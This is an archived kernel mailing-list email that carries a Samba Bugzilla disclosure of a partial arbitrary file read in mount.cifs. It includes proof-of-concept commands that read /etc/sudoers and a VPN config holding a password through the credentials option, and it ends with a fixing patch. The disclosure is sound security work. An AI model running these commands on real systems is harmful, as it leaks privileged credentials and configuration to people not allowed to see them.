Return-Path: <linux-cifs-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 843E2C433FE
	for <linux-cifs@archiver.kernel.org>; Mon, 21 Mar 2022 11:04:13 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1345718AbiCULFf (ORCPT <rfc822;linux-cifs@archiver.kernel.org>);
        Mon, 21 Mar 2022 07:05:35 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:51188 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1346700AbiCULF3 (ORCPT
        <rfc822;linux-cifs@vger.kernel.org>); Mon, 21 Mar 2022 07:05:29 -0400
Received: from hr2.samba.org (hr2.samba.org [IPv6:2a01:4f8:192:486::2:0])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 6721BE52
        for <linux-cifs@vger.kernel.org>; Mon, 21 Mar 2022 04:03:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=samba.org;
        s=42; h=Message-ID:Date:To:From:CC;
        bh=WNNYU+Irlq6ODUJNl0VZCkrFIUwpaeYltEINxMkqGzs=; b=VcZlbCE0YLxz1preONtWkqfWTQ
        wza53FQhVkDNQzJvDzL7NwBOMOFWSApneigqeekaNcejyE2/J+NxVeV5+qOCMapy4XOiAAMANVvRa
        gPJ/kIoUJx1o8aNd07gjpoUEJ+5s5Yv8ZhNVZXCD2YwnSOyQ8mwKPkeTKH8rE3mvvc3qlgReaBw2t
        sND7NResYsVhMX33p4muk+4LpUzFGN+0wdGmJ1CHZbePBpYlxiCAdz8m4mFWM05HJ//X7UEMV58X+
        rZsME2N4SiTFF/V8YmjJsadiGUeMNGmh0n/9RQXhiIEx5sO9lCy3p9a0cwPFPZUbFjVdNYSIcxcg1
        CZZZnSABSCmOTOz7f+vOC1BEuike6b4kC3LsEVbS/yrLQF+9UiUVWfUIeO7ZI/LyBmG4QnrMjo+PX
        sPiGj8GHRuj0MzM3xuS8Nkx5mReh/0RldJSQjMNoUn664Fo+6FcPzSc7HDG0uLl9ttvURw6cqMlYM
        n/fScYdq/cXSjnvSJrQimATh;
Received: from [2a01:4f8:192:486::6:0] (port=56458 helo=hr6.samba.org) 
        by hr2.samba.org with esmtps (TLS1.3:ECDHE_SECP256R1__RSA_PSS_RSAE_SHA256__CHACHA20_POLY1305:256)
        (Exim)
        id 1nWFpL-002c8V-I6
        for cifs-qa@samba.org; Mon, 21 Mar 2022 11:03:55 +0000
Received: from www-data by hr6.samba.org with local (Exim 4.93)
        (envelope-from <www-data@samba.org>)
        id 1nWFpK-001dVh-Ly
        for cifs-qa@samba.org; Mon, 21 Mar 2022 11:03:54 +0000
From:   samba-bugs@samba.org
To:     cifs-qa@samba.org
Subject: [Bug 15026] New: Partial arbitrary file read via mount.cifs
Date:   Mon, 21 Mar 2022 11:03:53 +0000
X-Bugzilla-Reason: QAcontact
X-Bugzilla-Type: new
X-Bugzilla-Watch-Reason: None
X-Bugzilla-Product: CifsVFS
X-Bugzilla-Component: user space tools
X-Bugzilla-Version: 5.x
X-Bugzilla-Keywords: 
X-Bugzilla-Severity: normal
X-Bugzilla-Who: jbe@improsec.com
X-Bugzilla-Status: NEW
X-Bugzilla-Resolution: 
X-Bugzilla-Priority: P5
X-Bugzilla-Assigned-To: jlayton@samba.org
X-Bugzilla-Target-Milestone: ---
X-Bugzilla-Flags: 
X-Bugzilla-Changed-Fields: bug_id short_desc product version rep_platform
 op_sys bug_status bug_severity priority component assigned_to reporter
 qa_contact cc target_milestone
Message-ID: <bug-15026-10630@https.bugzilla.samba.org/>
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="UTF-8"
X-Bugzilla-URL: https://bugzilla.samba.org/
Auto-Submitted: auto-generated
MIME-Version: 1.0
Precedence: bulk
List-ID: <linux-cifs.vger.kernel.org>
X-Mailing-List: linux-cifs@vger.kernel.org

https://bugzilla.samba.org/show_bug.cgi?id=3D15026

            Bug ID: 15026
           Summary: Partial arbitrary file read via mount.cifs
           Product: CifsVFS
           Version: 5.x
          Hardware: All
                OS: All
            Status: NEW
          Severity: normal
          Priority: P5
         Component: user space tools
          Assignee: jlayton@samba.org
          Reporter: jbe@improsec.com
        QA Contact: cifs-qa@samba.org
                CC: sfrench@samba.org
  Target Milestone: ---

Partial arbitrary file read via mount.cifs

The following was tested on cifs-utils version 6.14.

The "credentials" option of mount.cifs binary allow for partial arbitrary f=
ile
disclosure when the verbose flag is set. When a credential line is invalid,=
 the
following code is reached:

 571 static int open_cred_file(char *file_name,
 572                         struct parsed_mount_info *parsed_info)
 573 {
 ...
 637                 case CRED_UNPARSEABLE:
 638                         if (parsed_info->verboseflag)
 639                                 fprintf(stderr, "Credential formatted "
 640                                         "incorrectly: %s\n",
 641                                         temp_val ? temp_val : "(null)"=
);

Because of how credential files are formatted, any part of a line after an
equal sign in an invalid line is printed. Such lines can be found in sensit=
ive
files:

secure_path and rights in /etc/sudoers:

$ ls -l /etc/sudoers
-r--r----- 1 root root 670 Apr 20  2021 /etc/sudoers

$ sudo /usr/sbin/mount.cifs -v //127.0.0.1/share /mnt/share -o
credentials=3D/etc/sudoers
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly:
"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (ALL:ALL) ALL
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (ALL:ALL) ALL
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Password for root@//127.0.0.1/share:=20
mount.cifs kernel mount options:
ip=3D127.0.0.1,unc=3D\\127.0.0.1\share,user=3Droot,pass=3D********
mount error(111): could not connect to 127.0.0.1Unable to find suitable
address.

Passwords in /etc/openfortivpn/config:

$ ls -l /etc/openfortivpn/config
-rw------- 1 root root 154 Aug 28  2021 /etc/openfortivpn/config

$ sudo /usr/sbin/mount.cifs -v //127.0.0.1/share /mnt/share -o
credentials=3D/etc/openfortivpn/config
Credential formatted incorrectly: (null)
Credential formatted incorrectly: (null)
Credential formatted incorrectly:  vpn.example.org
Credential formatted incorrectly:  443
Credential formatted incorrectly:  vpnuser
Credential formatted incorrectly:  VPNpassw0rd
Password for root@//127.0.0.1/share:=20
mount.cifs kernel mount options:
ip=3D127.0.0.1,unc=3D\\127.0.0.1\share,user=3Droot,pass=3D********
mount error(111): could not connect to 127.0.0.1Unable to find suitable
address.

Note that either sudo rights on the mount.cifs binary or an entry in fstab =
are
needed to perform the read.

A possible mitigation is to get rid of the token value when printing the er=
ror
in verbose mode:

From: Jeffrey Bencteux <jbe@improsec.com>
Date: Sat, 19 Mar 2022 13:41:15 -0400
Subject: [PATCH] fix verbose message of credentials option

When supposed credential line is invalid, the verbose message prints
 part of it. This lead to information disclosure when the
 credentials file given is sensitive and contains '=3D' signs.

Signed-off-by: Jeffrey Bencteux <jbe@improsec.com>
---
 mount.cifs.c | 3 +--
 1 file changed, 1 insertion(+), 2 deletions(-)

diff --git a/mount.cifs.c b/mount.cifs.c
index 32521a7..82358a3 100644
--- a/mount.cifs.c
+++ b/mount.cifs.c
@@ -637,8 +637,7 @@ static int open_cred_file(char *file_name,
                case CRED_UNPARSEABLE:
                        if (parsed_info->verboseflag)
                                fprintf(stderr, "Credential formatted "
-                                       "incorrectly: %s\n",
-                                       temp_val ? temp_val : "(null)");
+                                       "incorrectly\n");
                        break;
                }
        }
--=20
2.33.0

--=20
You are receiving this mail because:
You are the QA Contact for the bug.=
